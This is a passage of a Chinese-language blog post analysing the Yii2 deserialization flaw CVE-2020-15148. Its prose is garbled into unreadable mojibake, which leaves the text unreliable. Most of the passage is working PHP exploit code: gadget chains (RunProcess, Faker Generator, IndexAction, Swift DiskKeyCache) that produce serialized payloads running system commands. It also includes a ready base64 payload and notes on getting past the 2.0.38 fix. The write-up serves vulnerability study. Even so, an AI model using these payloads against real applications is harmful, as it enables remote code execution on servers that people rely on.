punctuation">\</span>MockTrait</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">FnStream</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> <span class="token variable">$_fn_close</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_fn_close</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token keyword">new</span> <span class="token class-name">MockTrait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string single-quoted-string">'generate'</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>FnStream</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span>  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FnStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ç„¶è€Œä»£ç å¹¶æ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼Œçœ‹åˆ°æŠ¥é”™ä¿¡æ¯</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513175847226.png" alt loading="lazy"></p><p><code>__wakeup</code>æ–¹æ³•<code>throw</code>å‡ºå»äº†ï¼Œå½“ç„¶<code>__wakeup</code>å¯ç»•ï¼Œå‰ææ˜¯PHP5 &lt; 5.6.25ï¼Œ7.x &lt; 7.0.10ä¹‹å‰ï¼Œå…·ä½“ç»•è¿‡æ–¹æ³•ç½‘ä¸Šå¾ˆå¤šï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œæ‰§è¡Œæ•ˆæœå¦‚ä¸‹</p><p>paylaod:</p><pre class="language-none"><code class="language-none">TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoyNDoiR3V6emxlSHR0cFxQc3I3XEZuU3RyZWFtIjoyOntzOjk6Il9mbl9jbG9zZSI7YToyOntpOjA7TzozODoiUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxNb2NrVHJhaXQiOjI6e3M6NDk6IgBQSFBVbml0XEZyYW1ld29ya1xNb2NrT2JqZWN0XE1vY2tUcmFpdABjbGFzc0NvZGUiO3M6MTc6InN5c3RlbSgnd2hvYW1pJyk7IjtzOjQ4OiIAUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxNb2NrVHJhaXQAbW9ja05hbWUiO3M6ODoiZXh0cmFkZXIiO31pOjE7czo4OiJnZW5lcmF0ZSI7fX19</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513182520433.png" alt loading="lazy"></p><p>è¿™é‡Œå°±ç–‘æƒ‘äº†ï¼Œæˆ‘è¿™é‡Œphpæ˜æ˜æ˜¯php7.4çš„ç¯å¢ƒï¼Œä¸ºä»€ä¹ˆä¹Ÿå¯ä»¥ç»•ï¼Ÿï¼Ÿï¼Ÿ</p><p>æ—¢ç„¶<code>__wakeup</code>å¯ç»•ï¼Œé‚£<code>2.0.38</code>ç‰ˆæœ¬ä¿®å¤çš„æ–¹æ³•å°±æ˜¯åŠ ä¸€ä¸ª<code>__wakeup</code>æ–¹æ³•ï¼Œæ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥ç›´æ¥ç»•ï¼Ÿåœ¨githubä¸ŠåˆæŠŠ<code>2.0.38</code>ç‰ˆæœ¬çš„æºç ä¸‹ä¸‹æ¥ï¼Œç„¶åç”¨æ„é€ å¥½çš„ç»•è¿‡<code>__wakeup</code>çš„payloadæµ‹è¯•ï¼Œç›´æ¥æ²¡å›æ˜¾äº†ï¼ŒæŠ¥é”™ä¹Ÿæ²¡äº†ï¼Œæœ‰ç‚¹è¿·ï¼Œæœ‰ç‚¹è¿·ã€‚ã€‚ã€‚</p><h3 id="2-0-38ååºåˆ—åŒ–"><a href="#2-0-38ååºåˆ—åŒ–" class="headerlink" title="2.0.38ååºåˆ—åŒ–"></a>2.0.38ååºåˆ—åŒ–</h3><p>æ­¤å¤„å‚è€ƒ<a href="https://v0w.top/2020/09/22/Yii2unserialize/#0x03-%E6%96%B0%E7%89%88%E6%9C%AC2-0-38%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">é“¾æ¥</a>ï¼Œå¸ˆå‚…å¾ˆå¼ºï¼Œå­¦ä¹ äº†ï¼</p><h4 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h4><p>åˆ©ç”¨ç‚¹åœ¨<code>vendor/codeception/codeception/ext/RunProcess.php:93</code></p><p>é‡Œé¢æœ‰è¿™ä¸¤ä¸ªæ–¹æ³•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$process</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/** @var $process Process  **/</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$process</span><span class="token operator">-></span><span class="token function">isRunning</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">output</span><span class="token operator">-></span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[RunProcess] Stopping '</span> <span class="token operator">.</span> <span class="token variable">$process</span><span class="token operator">-></span><span class="token function">getCommandLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$process</span><span class="token operator">-></span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¯¹è±¡åœ¨é”€æ¯çš„æ—¶å€™ï¼Œè§¦å‘<code>__destruct</code>æ–¹æ³•ï¼Œ<code>__destruct</code>æ–¹æ³•è°ƒç”¨äº†<code>stopProcess</code>æ–¹æ³•ï¼Œ<code>stopProcess</code>æ–¹æ³•ä¸­çš„<code>$this-&gt;processes</code>å¯æ§ï¼Œå³<code>$process</code>ä¹Ÿå¯æ§ï¼Œ<code>$process</code>ä¼šè°ƒç”¨<code>isRunning()</code>æ–¹æ³•ï¼Œé‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥å°è¯•åˆ©ç”¨<code>__call</code>æ–¹æ³•äº†ï¼Œå¯ä»¥æ¥ç€ä¸Šé¢çš„<code>POP1</code>é“¾åˆ©ç”¨</p><p>å®Œæ•´çš„<code>pop</code>é“¾å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">stopProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token variable">$process</span><span class="token operator">-></span><span class="token function">isRunning</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context">Faker<span class="token punctuation">\</span>Generator</span><span class="token operator">::</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token operator">::</span><span class="token constant">run</span><span class="token operator">-></span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// EXP3: RunProcess -> ... -> __call()</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ls -al'</span><span class="token punctuation">;</span>           <span class="token comment">//command</span>            <span class="token comment">// run() -> call_user_func($this->checkAccess, $this->id);</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isRunning'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">IndexAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">//stopProcessæ–¹æ³•é‡Œåˆè°ƒç”¨äº†isRunning()æ–¹æ³•: $process->isRunning()</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">RunProcess</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$processes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¯·æ±‚ç»“æœå¦‚ä¸‹ï¼ŒæˆåŠŸå‘½ä»¤æ‰§è¡Œ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210513193606816.png" alt loading="lazy"></p><h4 id="POP4"><a href="#POP4" class="headerlink" title="POP4"></a>POP4</h4><p>åˆ©ç”¨ç‚¹åœ¨<code>vendor\swiftmailer\swiftmailer\lib\classes\Swift\KeyCache\DiskKeyCache.php</code>ä¸­</p><p>ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span> <span class="token keyword">as</span> <span class="token variable">$nsKey</span> <span class="token operator">=></span> <span class="token variable">$null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">clearAll</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">clearAll</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span><span class="token punctuation">[</span><span class="token variable">$nsKey</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$itemKey</span> <span class="token operator">=></span> <span class="token variable">$null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">clearKey</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$nsKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span><span class="token punctuation">[</span><span class="token variable">$nsKey</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">clearKey</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">hasKey</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">freeHandle</span><span class="token punctuation">(</span><span class="token variable">$nsKey</span><span class="token punctuation">,</span> <span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$nsKey</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$itemKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><code>unlink</code>ä½¿ç”¨æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œ<code>$this-&gt;path</code>å¯æ§ï¼Œå³å¯æƒ³åˆ°è°ƒç”¨<code>__toString</code>æ–¹æ³•ï¼ˆå½“ä¸€ä¸ªå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è¢«è°ƒç”¨ï¼‰</p><p>å…¨å±€æŸ¥æ‰¾<code>__toString()</code>æ–¹æ³•ï¼Œæœ€å¥½æ‰¾ä¸€äº›<strong>è°ƒç”¨å…¶ä»–ç±»å‡½æ•°</strong>çš„<code>__toString</code></p><p>æœ‰å¦‚ä¸‹çš„å‡ ä¸ªç±»ä¸­çš„<code>__toString</code>æ–¹æ³•å¯ç”¨ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Codeception<span class="token punctuation">\</span>Util<span class="token punctuation">\</span>XmlBuilder</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>DOMDocument</span><span class="token operator">::</span><span class="token constant">saveXML</span> å¯ä»¥è§¦å‘__callæ–¹æ³•<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Covers</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span> å¯ä»¥è§¦å‘__callæ–¹æ³•<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Deprecated</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span> å¯ä»¥è§¦å‘__callæ–¹æ³•<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Generic</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span> å¯ä»¥è§¦å‘__callæ–¹æ³•<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>See</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span>å¯ä»¥è§¦å‘__callæ–¹æ³•<span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Link</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">render</span><span class="token operator">...</span></code></pre><p>è¿™é‡Œä»¥<code>\Codeception\Util\XmlBuilder::__toString</code>ä¸ºä¾‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">__dom__</span><span class="token operator">-></span><span class="token function">saveXML</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>$this-&gt;__dom__</code>å¯æ§ï¼Œåœ¨è°ƒç”¨<code>saveXML()</code>æ–¹æ³•çš„æ—¶å€™ä¼šè°ƒç”¨<code>__call</code>æ–¹æ³•ã€‚</p><p>popé“¾å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Swift_KeyCache_DiskKeyCache</span><span class="token operator">::</span><span class="token constant">__destruct</span> <span class="token operator">-></span> <span class="token property">clearAll</span> <span class="token operator">-></span> <span class="token property">clearKey</span> <span class="token operator">-></span> <span class="token property">__toString</span><span class="token operator">-></span> <span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>Codeception<span class="token punctuation">\</span>Util<span class="token punctuation">\</span>XmlBuilder</span><span class="token operator">::</span><span class="token constant">__toString</span> <span class="token operator">-></span> <span class="token property">saveXML</span><span class="token operator">-></span> <span class="token class-name class-name-fully-qualified static-context">Faker<span class="token punctuation">\</span>Generator</span><span class="token operator">::</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token operator">::</span><span class="token constant">run</span> <span class="token operator">-></span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// EXP: Swift_KeyCache_DiskKeyCache::__destruct -> __toString -> __call</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Codeception<span class="token punctuation">\</span>Util<span class="token punctuation">\</span>XmlBuilder</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags<span class="token punctuation">\</span>Covers</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Swift_KeyCache_DiskKeyCache</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$path</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$keys</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token string double-quoted-string">"extrader"</span> <span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"is"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"am"</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//æ³¨æ„ ClearAllä¸­çš„æ•°ç»„è§£æäº†ä¸¤æ¬¡ï¼Œä¹‹åå†unlink</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XmlBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Swift_KeyCache_DiskKeyCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Util</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">XmlBuilder</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$__dom__</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">__dom__</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">phpDocumentor<span class="token punctuation">\</span>Reflection<span class="token punctuation">\</span>DocBlock<span class="token punctuation">\</span>Tags</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Covers</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$refers</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$description</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">description</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token 